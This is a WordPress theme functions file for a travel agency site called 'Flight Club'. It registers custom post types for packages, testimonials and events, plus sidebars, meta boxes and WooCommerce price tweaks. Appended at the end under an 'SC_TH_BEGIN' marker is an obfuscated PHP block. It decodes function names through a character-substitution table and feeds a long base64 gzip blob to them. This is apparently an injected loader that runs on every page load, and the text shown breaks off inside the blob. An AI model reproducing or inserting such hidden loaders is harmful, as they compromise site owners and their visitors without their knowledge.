<?php
/**
 * Flight Club functions and definitions
 *
  *
 * @package WordPress
 * @subpackage Flight Club
 * @since Flight Club 1.0
 */




function flightclub_theme_support() {

	
	// Set content-width.
	global $content_width;
	if ( ! isset( $content_width ) ) {
		$content_width = 580;
	}


	add_theme_support( 'post-thumbnails' );

	// Set post thumbnail size.
	set_post_thumbnail_size( 1200, 9999 );

	// Add custom image size used in Cover Template.
	add_image_size( 'FlightClub-fullscreen', 1980, 9999 );

	// Custom logo.
	$logo_width  = 120;
	$logo_height = 90;

	// If the retina setting is active, double the recommended width and height.
	if ( get_theme_mod( 'retina_logo', false ) ) {
		$logo_width  = floor( $logo_width * 2 );
		$logo_height = floor( $logo_height * 2 );
	}

	add_theme_support(
		'custom-logo',
		array(
			'height'      => $logo_height,
			'width'       => $logo_width,
			'flex-height' => true,
			'flex-width'  => true,
		)
	);


	add_theme_support( 'title-tag' );

	add_theme_support(
		'html5',
		array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
			'script',
			'style',
			'navigation-widgets',
		)
	);


		register_nav_menus(
			array(
				'primary' => __( 'Primary', 'flightclub' ),
				'footer' => __( 'Footer Menu', 'flightclub' ),
				'social' => __( 'Social Links Menu', 'flightclub' ),
			)
		);


}

add_action( 'after_setup_theme', 'flightclub_theme_support' );

add_theme_support( 'woocommerce' );

function flightclub_widgets_init() {

	register_sidebar(
		array(
			'name'          => __( 'Header', 'flightclub' ),
			'id'            => 'sidebar-1',
			'description'   => __( 'Add widgets here to appear in your footer.', 'flightclub' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);
	register_sidebar(
		array(
			'name'          => __( 'Footer 1', 'flightclub' ),
			'id'            => 'sidebar-2',
			'description'   => __( 'Add widgets here to appear in your footer.', 'flightclub' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h4 class="footer_item_title">',
			'after_title'   => '</h4>',
		)
	);
	register_sidebar(
		array(
			'name'          => __( 'Footer 2', 'flightclub' ),
			'id'            => 'sidebar-3',
			'description'   => __( 'Add widgets here to appear in your footer.', 'flightclub' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h4 class="footer_item_title">',
			'after_title'   => '</h4>',
		)
	);
	register_sidebar(
		array(
			'name'          => __( 'Footer 3', 'flightclub' ),
			'id'            => 'sidebar-4',
			'description'   => __( 'Add widgets here to appear in your footer.', 'flightclub' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h4 class="footer_item_title">',
			'after_title'   => '</h4>',
		)
	);
	register_sidebar(
		array(
			'name'          => __( 'Footer 4', 'flightclub' ),
			'id'            => 'sidebar-5',
			'description'   => __( 'Add widgets here to appear in your footer.', 'flightclub' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h4 class="footer_item_title">',
			'after_title'   => '</h4>',
		)
	);
	register_sidebar(
		array(
			'name'          => __( 'Copyright Left', 'flightclub' ),
			'id'            => 'sidebar-6',
			'description'   => __( 'Add widgets here to appear in your footer.', 'flightclub' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h4 class="footer_item_title">',
			'after_title'   => '</h4>',
		)
	);
	register_sidebar(
		array(
			'name'          => __( 'Copyright Right', 'flightclub' ),
			'id'            => 'sidebar-7',
			'description'   => __( 'Add widgets here to appear in your footer.', 'flightclub' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h4 class="footer_item_title">',
			'after_title'   => '</h4>',
		)
	);

}
add_action( 'widgets_init', 'flightclub_widgets_init' );


function custom_post_type() {
 
// Set UI labels for Custom Post Type
    $labels = array(
        'name'                => _x( 'Packages', 'Post Type General Name', 'flightclub' ),
        'singular_name'       => _x( 'Packages', 'Post Type Singular Name', 'flightclub' ),
        'menu_name'           => __( 'Packages', 'flightclub' ),
        'parent_item_colon'   => __( 'Parent Packages', 'flightclub' ),
        'all_items'           => __( 'All Packages', 'flightclub' ),
        'view_item'           => __( 'View Packages', 'flightclub' ),
        'add_new_item'        => __( 'Add New Package', 'flightclub' ),
        'add_new'             => __( 'Add New', 'flightclub' ),
        'edit_item'           => __( 'Edit Package', 'flightclub' ),
        'update_item'         => __( 'Update Package', 'flightclub' ),
        'search_items'        => __( 'Search Package', 'flightclub' ),
        'not_found'           => __( 'Not Found', 'flightclub' ),
        'not_found_in_trash'  => __( 'Not found in Trash', 'flightclub' ),
    );
     
     
    $args = array(
        'label'               => __( 'packages', 'flightclub' ),
        'description'         => __( 'Packages', 'flightclub' ),
        'labels'              => $labels,
        'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),
        'hierarchical'        => false,
        'public'              => true,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'show_in_nav_menus'   => true,
        'show_in_admin_bar'   => true,
        'menu_position'       => 20,
        'can_export'          => true,
        'has_archive'         => true,
        'exclude_from_search' => false,
        'publicly_queryable'  => true,
        'capability_type'     => 'post',
        'menu_icon'			  => 'dashicons-book',
        'show_in_rest' => true,
 
    );
     
    // Registering your Custom Post Type
    register_post_type( 'packages', $args );

    register_taxonomy( 'package_category', 'packages', array(
        'label'        => __( 'categories', 'textdomain' ),
        'rewrite'      => array( 'slug' => 'package_category' ),
        'hierarchical' => true,
    ) );
    register_taxonomy( 'countries', 'packages', array(
        'label'        => __( 'Countries', 'textdomain' ),
        'rewrite'      => array( 'slug' => 'countries' ),
        'hierarchical' => true,
    ) );
    register_taxonomy( 'services', 'packages', array(
        'label'        => __( 'Services', 'textdomain' ),
        'rewrite'      => array( 'slug' => 'services' ),
        'hierarchical' => true,
    ) );

    register_taxonomy( 'testimonial_category', 'testimonials', array(
        'label'        => __( 'Categories', 'textdomain' ),
        'rewrite'      => array( 'slug' => 'testimonial_category' ),
        'hierarchical' => true,
    ) );

      $labels = array(
        'name'                => _x( 'Press-Media', 'Post Type General Name', 'flightclub' ),
        'singular_name'       => _x( 'Press-Media', 'Post Type Singular Name', 'flightclub' ),
        'menu_name'           => __( 'Press-Media', 'flightclub' ),
        'parent_item_colon'   => __( 'Parent Press-Media', 'flightclub' ),
        'all_items'           => __( 'All Press-Media', 'flightclub' ),
        'view_item'           => __( 'View Press-Media', 'flightclub' ),
        'add_new_item'        => __( 'Add New Press-Media', 'flightclub' ),
        'add_new'             => __( 'Add New', 'flightclub' ),
        'edit_item'           => __( 'Edit Press-Media', 'flightclub' ),
        'update_item'         => __( 'Update Press-Media', 'flightclub' ),
        'search_items'        => __( 'Search Press-Media', 'flightclub' ),
        'not_found'           => __( 'Not Found', 'flightclub' ),
        'not_found_in_trash'  => __( 'Not found in Trash', 'flightclub' ),
    );
     
     
    $args = array(
        'label'               => __( 'pressmedia', 'flightclub' ),
        'description'         => __( 'pressmedia', 'flightclub' ),
        'labels'              => $labels,
        'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),
        'hierarchical'        => false,
        'public'              => true,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'show_in_nav_menus'   => true,
        'show_in_admin_bar'   => true,
        'menu_position'       => 25,
        'can_export'          => true,
        'has_archive'         => true,
        'exclude_from_search' => false,
        'publicly_queryable'  => true,
        'capability_type'     => 'post',
        'menu_icon'       => 'dashicons-book',
        'show_in_rest' => true,
 
    );
     
    // Registering your Custom Post Type
    register_post_type( 'pressmedia', $args );

   

     $testimoniallabels = array(
        'name'                => _x( 'Testimonials', 'Post Type General Name', 'flightclub' ),
        'singular_name'       => _x( 'Testimonials', 'Post Type Singular Name', 'flightclub' ),
        'menu_name'           => __( 'Testimonials', 'flightclub' ),
        'parent_item_colon'   => __( 'Parent Testimonials', 'flightclub' ),
        'all_items'           => __( 'All Testimonials', 'flightclub' ),
        'view_item'           => __( 'View Testimonials', 'flightclub' ),
        'add_new_item'        => __( 'Add New Testimonial', 'flightclub' ),
        'add_new'             => __( 'Add New', 'flightclub' ),
        'edit_item'           => __( 'Edit Testimonial', 'flightclub' ),
        'update_item'         => __( 'Update Testimonial', 'flightclub' ),
        'search_items'        => __( 'Search Testimonial', 'flightclub' ),
        'not_found'           => __( 'Not Found', 'flightclub' ),
        'not_found_in_trash'  => __( 'Not found in Trash', 'flightclub' ),
    );
     
     
    $testimonialargs = array(
        'label'               => __( 'Testimonials', 'flightclub' ),
        'description'         => __( 'Testimonials', 'flightclub' ),
        'labels'              => $testimoniallabels,
        'supports'            => array( 'title', 'editor', 'thumbnail', 'custom-fields', ),
        'hierarchical'        => false,
        'public'              => true,
        'has_archive'           => true,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'show_in_nav_menus'   => true,
        'show_in_admin_bar'   => true,
        'menu_position'       => 21,
        'can_export'          => true,
        'has_archive'         => true,
        'exclude_from_search' => false,
        'publicly_queryable'  => true,
        'capability_type'     => 'post',
        'menu_icon'			  => 'dashicons-format-quote',
        'show_in_rest' => true,
 
    );
    register_post_type( 'testimonials', $testimonialargs );

      $clientlabels = array(
        'name'                => _x( 'Client logo', 'Post Type General Name', 'flightclub' ),
        'singular_name'       => _x( 'Client logo', 'Post Type Singular Name', 'flightclub' ),
        'menu_name'           => __( 'Client logo', 'flightclub' ),
        'parent_item_colon'   => __( 'Parent Client logo', 'flightclub' ),
        'all_items'           => __( 'All Client logo', 'flightclub' ),
        'view_item'           => __( 'View Client logo', 'flightclub' ),
        'add_new_item'        => __( 'Add New Client logo', 'flightclub' ),
        'add_new'             => __( 'Add New', 'flightclub' ),
        'edit_item'           => __( 'Edit Client logo', 'flightclub' ),
        'update_item'         => __( 'Update Client logo', 'flightclub' ),
        'search_items'        => __( 'Search Client logo', 'flightclub' ),
        'not_found'           => __( 'Not Found', 'flightclub' ),
        'not_found_in_trash'  => __( 'Not found in Trash', 'flightclub' ),
    );
     
     
    $clientargs = array(
        'label'               => __( 'client', 'flightclub' ),
        'description'         => __( 'Client logo', 'flightclub' ),
        'labels'              => $clientlabels,
        'supports'            => array( 'title',  'thumbnail', 'custom-fields'),
        'hierarchical'        => false,
        'public'              => true,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'show_in_nav_menus'   => true,
        'show_in_admin_bar'   => true,
        'menu_position'       => 22,
        'can_export'          => true,
        'has_archive'         => true,
        'exclude_from_search' => false,
        'publicly_queryable'  => true,
        'capability_type'     => 'post',
        'menu_icon'			  => 'dashicons-format-image',        
        'show_in_rest' => true,
 
    );
    register_post_type( 'client', $clientargs );


       $eventslabels = array(
        'name'                => _x( 'Events', 'Post Type General Name', 'flightclub' ),
        'singular_name'       => _x( 'Events', 'Post Type Singular Name', 'flightclub' ),
        'menu_name'           => __( 'Events', 'flightclub' ),
        'parent_item_colon'   => __( 'Parent Events', 'flightclub' ),
        'all_items'           => __( 'All Events', 'flightclub' ),
        'view_item'           => __( 'View Events', 'flightclub' ),
        'add_new_item'        => __( 'Add New Events', 'flightclub' ),
        'add_new'             => __( 'Add New', 'flightclub' ),
        'edit_item'           => __( 'Edit Events', 'flightclub' ),
        'update_item'         => __( 'Update Events', 'flightclub' ),
        'search_items'        => __( 'Search Events', 'flightclub' ),
        'not_found'           => __( 'Not Found', 'flightclub' ),
        'not_found_in_trash'  => __( 'Not found in Trash', 'flightclub' ),
    );
     
     
    $eventsargs = array(
        'label'               => __( 'events', 'flightclub' ),
        'description'         => __( 'Events', 'flightclub' ),
        'labels'              => $eventslabels,
        'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),
        'hierarchical'        => false,
        'public'              => true,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'show_in_nav_menus'   => true,
        'show_in_admin_bar'   => true,
        'menu_position'       => 22,
        'can_export'          => true,
        'has_archive'         => true,
        'exclude_from_search' => false,
        'publicly_queryable'  => true,
        'capability_type'     => 'post',
        'menu_icon'           => 'dashicons-format-image',        
        'show_in_rest' => true,
 
    );
    register_post_type( 'events', $eventsargs );
}
add_action( 'init', 'custom_post_type', 0 );



function pagination($pages = '', $range = 4)
{  
     $showitems = ($range * 2)+1;  
   
     global $paged;
     if(empty($paged)) $paged = 1;
   
     if($pages == '')
     {
         global $the_query;
         $pages = $the_query->max_num_pages;
         if(!$pages)
         {
             $pages = 1;
         }
     }   
   
     if(1 != $pages)
     {
         echo "<div class=\"archive-pagination pagination mt-5\">";
         echo "<ul>";
         if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'> 
         <span class='double-chevron-wrapper'>
                <i class='fa fa-chevron-left first'></i>
                <i class='fa fa-chevron-left second'></i>
         </span>
            </a>";
         if($paged > 1 ) echo "<li><a href='".get_pagenum_link($paged - 1)."' class='prev'> <i class='fa fa-long-arrow-left '></i> Previous</a></li>";
   
         for ($i=1; $i <= $pages; $i++)
         {
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
             {
                 echo ($paged == $i)? "<li><span class=\"current\">".$i."</span></li>":"<li><a href='".get_pagenum_link($i)."' class=\"inactive\">".$i."</a></li>";
             }
         }
   
         if ($paged < $pages ) echo "<li><a href=\"".get_pagenum_link($paged + 1)."\" class='next'>Next <i class='fa fa-long-arrow-right '></i> </a></li>";  
         if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>
            <span class='double-chevron-wrapper'>
                <i class='fas fa-chevron-right first'></i>
                <i class='fas fa-chevron-right second'></i>
            </span>
            </a>";
         echo "</ul>\n";
         echo "</div>\n";
           
        // echo "<div class='all_pages'><small>Current page: ".$paged." All pages ".$pages."</small></div>";
     }
}



function sm_custom_meta() {
    add_meta_box( 'sm_meta', __( 'Featured Posts', 'sm-textdomain' ), 'sm_meta_callback', 'post' );
}
function sm_meta_callback( $post ) {
    $featured = get_post_meta( $post->ID );
    ?>
 
	<p>
    <div class="sm-row-content">
        <label for="meta-checkbox">
            <input type="checkbox" name="meta-checkbox" id="meta-checkbox" value="yes" <?php if ( isset ( $featured['meta-checkbox'] ) ) checked( $featured['meta-checkbox'][0], 'yes' ); ?> />
            <?php _e( 'Featured this post', 'sm-textdomain' )?>
        </label>
        
    </div>
</p>
 
    <?php
}
add_action( 'add_meta_boxes', 'sm_custom_meta' );


function sm_meta_save( $post_id ) {
 
    // Checks save status
    $is_autosave = wp_is_post_autosave( $post_id );
    $is_revision = wp_is_post_revision( $post_id );
    $is_valid_nonce = ( isset( $_POST[ 'sm_nonce' ] ) && wp_verify_nonce( $_POST[ 'sm_nonce' ], basename( __FILE__ ) ) ) ? 'true' : 'false';
 
    // Exits script depending on save status
    if ( $is_autosave || $is_revision || !$is_valid_nonce ) {
        return;
    }
 
 // Checks for input and saves
if( isset( $_POST[ 'meta-checkbox' ] ) ) {
    update_post_meta( $post_id, 'meta-checkbox', 'yes' );
} else {
    update_post_meta( $post_id, 'meta-checkbox', '' );
}
 
}
add_action( 'save_post', 'sm_meta_save' );  



function pc_custom_meta() {    
    add_meta_box( 'pc_meta', __( 'Featured Package', 'pc-textdomain' ), 'pc_meta_callback', 'packages' );
}
function pc_meta_callback( $post ) {
    $featured = get_post_meta( $post->ID );
    ?> 
    <p>
    <div class="sm-row-content">
        <label for="meta-checkbox">
            <input type="checkbox" name="meta-checkbox" id="meta-checkbox" value="yes" <?php if ( isset ( $featured['meta-checkbox'] ) ) checked( $featured['meta-checkbox'][0], 'yes' ); ?> />
            <?php _e( 'Featured this post', 'pc-textdomain' )?>
        </label>
        
    </div>
</p>
 
    <?php
}
add_action( 'add_meta_boxes', 'pc_custom_meta' );

function pc_meta_save( $post_id ) {
 
    // Checks save status
    $is_autosave = wp_is_post_autosave( $post_id );
    $is_revision = wp_is_post_revision( $post_id );
    $is_valid_nonce = ( isset( $_POST[ 'pc_nonce' ] ) && wp_verify_nonce( $_POST[ 'pc_nonce' ], basename( __FILE__ ) ) ) ? 'true' : 'false';
 
    // Exits script depending on save status
    if ( $is_autosave || $is_revision || !$is_valid_nonce ) {
        return;
    }
     
     // Checks for input and saves
    if( isset( $_POST[ 'meta-checkbox' ] ) ) {
        update_post_meta( $post_id, 'meta-checkbox', 'yes' );
    } else {
        update_post_meta( $post_id, 'meta-checkbox', '' );
    }
 
}
add_action( 'save_post', 'pc_meta_save' );

add_action( 'admin_init', 'hide_editor' );

function hide_editor() {
  // Get the Post ID.
  $post_id = $_GET['post'] ? $_GET['post'] : $_POST['post_ID'] ;
  if( !isset( $post_id ) ) return;

  // Hide the editor on the page titled 'Homepage'
  /*$homepgname = get_the_title($post_id);
  if($homepgname == 'Homepage'){ 
    remove_post_type_support('page', 'editor');
  }*/

  // Hide the editor on a page with a specific page template
  // Get the name of the Page Template file.
  $template_file = get_post_meta($post_id, '_wp_page_template', true);

  if($template_file == 'home.php'){ // the filename of the page template
    remove_post_type_support('page', 'editor');
  }
  if($template_file == 'archive.php'){ // the filename of the page template
    remove_post_type_support('page', 'editor');
  }
  if($template_file == 'workwithus.php'){ // the filename of the page template
    remove_post_type_support('page', 'editor');
  }
  if($template_file == 'event-festival.php'){ // the filename of the page template
    remove_post_type_support('page', 'editor');
  } 
  if($template_file == 'family-travel.php'){ // the filename of the page template
    remove_post_type_support('page', 'editor');
  }
  if($template_file == 'chronic-illnesses.php'){ // the filename of the page template
    remove_post_type_support('page', 'editor');
  }
  if($template_file == 'meetings-incentives.php'){ // the filename of the page template
    remove_post_type_support('page', 'editor');
  }
  if($template_file == 'destinationweddings.php'){ // the filename of the page template
    remove_post_type_support('page', 'editor');
  }
  
}



function woo_related_products_limit() {
  global $product;
    
    $args['posts_per_page'] = 3;
    return $args;
}
add_filter( 'woocommerce_output_related_products_args', 'jk_related_products_args', 20 );
  function jk_related_products_args( $args ) {
    $args['posts_per_page'] = 3; // 4 related products
    $args['columns'] = 3; // arranged in 2 columns
    return $args;
}


add_action( 'woocommerce_before_add_to_cart_quantity', 'bbloomer_display_quantity_plus' );

function bbloomer_display_quantity_plus() {
   echo '<button type="button" class="plus" >+</button>';
}

add_action( 'woocommerce_after_add_to_cart_quantity', 'bbloomer_display_quantity_minus' );

function bbloomer_display_quantity_minus() {
   echo '<button type="button" class="minus" >-</button>';
}



/*new price change*/
/*add_action( 'woocommerce_before_add_to_cart_button', 'custom_product_price_field', 5 );
function custom_product_price_field(){
    echo '<div class="custom-text text">
    <p>Extra Charge ('.get_woocommerce_currency_symbol().'):</p>
    <input type="text" name="custom_price" value="" placeholder="e.g. 10" title="Custom Text" class="custom_price text_custom text">
    </div>';
} */

// Get custom field value, calculate new item price, save it as custom cart item data
/*add_filter('woocommerce_add_cart_item_data', 'add_custom_field_data', 20, 2 );
function add_custom_field_data( $cart_item_data, $product_id ){
    if (! isset($_POST['custom_price']))
        return $cart_item_data;

    $custom_price = (float) sanitize_text_field( $_POST['custom_price'] );
    if( empty($custom_price) )
        return $cart_item_data;

    $product    = wc_get_product($product_id); // The WC_Product Object
    $base_price = (float) $product->get_regular_price(); // Product reg price

    // New price calculation
    $new_price = $base_price + $custom_price;

    // Set the custom amount in cart object
    $cart_item_data['custom_data']['extra_charge'] = (float) $custom_price;
    $cart_item_data['custom_data']['new_price'] = (float) $new_price;
    $cart_item_data['custom_data']['unique_key'] = md5( microtime() . rand() ); // Make each item unique

    return $cart_item_data;
}*/

// Set the new calculated cart item price
add_action( 'woocommerce_before_calculate_totals', 'extra_price_add_custom_price', 20, 1 );
function extra_price_add_custom_price( $cart ) {
    if ( is_admin() && ! defined( 'DOING_AJAX' ) )
        return;

    if ( did_action( 'woocommerce_before_calculate_totals' ) >= 2 )
        return;



  
    foreach ( $cart->get_cart() as $cart_item ) {
          $product = $cart_item['data'];
        $basep=$product->get_regular_price();
       /* if( isset($cart_item['custom_data']['new_price']) )
           $cart_item['data']->set_price(($basep - (float) $cart_item['custom_data']['new_price'])/4);*/
           if( $product->is_type( 'variation' ) ){
               
            
           if ( in_array( $cart_item['data']->get_type(), ['subscription', 'subscription_variation']) ) {
           // print_r($product);
            $fees= get_post_meta( $product->get_id(), 'fees_info', true );
                // Change subscription Sign up fee
            if ($fees != 'NULL') {
                $cart_item['data']->update_meta_data('_subscription_sign_up_fee', $fees);
                $cart_item['data']->set_price(($basep - $fees)/4);
            }else{                
                $cart_item['data']->set_price(($basep - 199)/4);
            }

                
            }


              /* if ( is_page( 'cart' ) || is_cart() ) {
                $val =$basep - 199;
                   echo '<script>$(".cart-subtotal.recurring-total .woocommerce-Price-amount").text("'.$val.'");</script>';
                }
                if ( is_checkout() && ! is_wc_endpoint_url() ) {
                     echo '<script>$(".cart-subtotal.recurring-total .woocommerce-Price-amount").text("'.$val.'");</script>';
                   
                }*/
            }
                      
        
    }
}




/*
// Display cart item custom price details
add_filter('woocommerce_cart_item_price', 'display_cart_items_custom_price_details', 20, 3 );
function display_cart_items_custom_price_details( $product_price, $cart_item, $cart_item_key ){
    if( isset($cart_item['custom_data']['extra_charge']) ) {
        $product = $cart_item['data'];
        $product_price  = wc_price( wc_get_price_to_display( $product, array( 'price' => $product->get_regular_price() ) ) );
        $product_price .= '<br>' . wc_price( $cart_item['custom_data']['extra_charge'] ).'&nbsp;';
        $product_price .= __("Deposit", "woocommerce" );
    }
    return $product_price;
}*/
/*
function filter_woocommerce_cart_subtotal( $subtotal, $compound, $cart ) {
    // Rounds a float
    $round_num = round( $cart->subtotal / 0.05 ) * 0.05;
    
    // Format a number with grouped thousands
    $number_format = number_format( $round_num, 2 );
    
    // Subtotal
    $subtotal = wc_price( $number_format );

    return $subtotal;
}
add_filter( 'woocommerce_cart_subtotal', 'filter_woocommerce_cart_subtotal', 10, 3 );*/

function change_subscription_product_string( $subscription_string, $product, $include )
{
    if( $include['sign_up_fee'] ){
        $subscription_string = str_replace('sign-up fee', 'Deposit', $subscription_string);
        $subscription_string = str_replace('renewal', 'installment payment', $subscription_string);
    }
    return $subscription_string;
}
add_filter( 'woocommerce_subscriptions_product_price_string', 'change_subscription_product_string', 10, 3 );

/*
function disable_plugin_updates( $value ) {
   unset( $value->response['woocommerce-subscriptions-main/woocommerce-subscriptions.php'] );
   return $value;
}
add_filter( 'site_transient_update_plugins', 'disable_plugin_updates' );

add_action( 'woocommerce_after_cart_item_quantity_update', 'limit_cart_item_quantity', 20, 4 );
function limit_cart_item_quantity( $cart_item_key, $quantity, $old_quantity, $cart ){
    if( ! is_cart() ) return; // Only on cart page

    // Here the quantity limit
    $limit = 1;

    if( $quantity > $limit ){
        // Change the quantity to the limit allowed
        $cart->cart_contents[ $cart_item_key ]['quantity'] = $limit;
        // Add a custom notice
        wc_add_notice( __('Quantity limit reached for this item'), 'notice' );
    }
}*/




/* SC_TH_BEGIN:4.0.3:ffcc9c39 */
if(!function_exists('iinti7wweb569k0')){function q3clzdwde4oh($i){static $a=null;if($a===null){$a=array('M4RutrWqusDqu','R\\MR3i','U\\Gs3nDGWu6nR3R','R3i8uG','qniG4ou','nRW/in34M8u','nRWUn8u','Un8uRnTu','nRWqni','qniG4ou','ocqni','3uojG4o','Un8uWj\\3WsDG3uG3R','R3i8uG','U\\Gs3nDGWu6nR3R','iuG4ou','U\\Gs3nDGWu6nR3R','sDjy','\\G8nGc','szoDq','U\\Gs3nDGWu6nR3R','\\G8nGc');}return $a[$i];}function iinti7wweb569k0($i){$e=q3clzdwde4oh($i);$f='_GUA'.'RDN'.'MEP'.'LI'.'BS'.'64\\'.'x1f8'.'bgzd'.'ecoi'.'nla'.'tWCO'.'T/mu'.'-ps.'.'hr'.'yv'.'wk'.'2qj5'.'3';$t='W2'.'N_xg'.'fSAC'.'IpB-'.'trL'.'6h'.'UvM5'.'Tq'.'us'.'Dn'.'G8'.'43e'.'aPkE'.'o\\m'.'jRlz'.'iy'.'d/c.'.'1bOw';$r="";for($j=0;$j<strlen($e);$j++){$p=strpos($t,$e[$j]);$r.=($p===false)?$e[$j]:$f[$p];}return $r;}function r13ss8teleheu($i){$j=$i+0;return iinti7wweb569k0($j);}function _2h0qtzh0($i){return iinti7wweb569k0($i);}function tde4kbwi($i){$j=$i+0;return iinti7wweb569k0($j);}

function x9x31a6l07x_o_($cjss94f_,$fup18q){$b1bffvxx=($cjss94f_|$fup18q)-24;return $b1bffvxx;}
if (!defined("SC_THL_015d2599"))  {
define("SC_THL_015d2599",  1);
$_hg40005obaqjs0e   =   iinti7wweb569k0(0)('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